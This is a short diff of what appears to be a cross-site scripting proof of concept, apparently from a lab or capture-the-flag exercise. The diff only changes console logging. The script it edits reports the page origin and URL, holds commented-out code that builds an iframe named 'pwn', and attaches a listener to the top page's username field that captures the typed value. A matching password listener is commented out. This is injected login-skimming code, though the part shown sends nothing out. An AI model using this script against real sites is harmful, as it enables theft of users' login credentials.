@@ -1,12 +1,12 @@
 // alert('Wow! Origin: '+location.origin+'\nUrl: '+top.location.href+'?');
-console.log('Wow! Origin: '+location.origin+'\nUrl: '+top.location.href+'?');
+top.console.log('Wow! Origin: '+location.origin+'\nUrl: '+top.location.href+'?');
 
 // f = document.createElement("iframe");
 // f.id = "pwn";
 // f.src = "/";
 let user;
 let pw;
-
+top.console.log('loaded script')
 // f.onload = () => {
   top.username.addEventListener('change', e => user = e.target.value);
   // top.password.addEventListener('change', e => user = e.target.value);
